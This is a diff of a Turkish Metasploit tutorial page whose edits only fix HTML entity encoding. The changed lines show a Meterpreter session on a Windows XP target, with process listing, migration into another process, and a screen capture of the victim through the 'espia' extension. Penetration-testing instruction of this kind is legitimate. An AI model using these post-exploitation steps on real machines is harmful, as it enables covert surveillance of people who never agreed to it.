@@ -37,9 +37,9 @@ Hedef bilgisayarda meterpreter oturum açtığınızı farz ediyoruz. Öncelikle
 **[*********]** Started bind handler
 **[*********]** Trying target Windows XP SP2 - English...
 **[*********]** Sending stage **(**719360 bytes**)**
-**[*********]** Meterpreter session 1 opened **(**192.168.1.101:34117 -&gt; 192.168.1.104:4444**)**
+**[*********]** Meterpreter session 1 opened **(**192.168.1.101:34117 -> 192.168.1.104:4444**)**
 
-meterpreter **&gt;** ps
+meterpreter **>** ps
 
 Process list
 **============**
@@ -85,7 +85,7 @@ Process list
 
 
 ```bash
-meterpreter **&gt;** migrate 260
+meterpreter **>** migrate 260
 **[*********]** Migrating to 260...
 **[*********]** Migration completed successfully.
 ```
@@ -96,7 +96,7 @@ Ardından `espia` eklentisini aktif hale getirelim.
 
 
 ```bash
-meterpreter **&gt;** use espia
+meterpreter **>** use espia
 Loading extension espia...success.
 ```
 
@@ -106,9 +106,9 @@ Loading extension espia...success.
 
 
 ```bash
-meterpreter **&gt;** screengrab
+meterpreter **>** screengrab
 Screenshot saved to: /root/nYdRUppb.jpeg
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
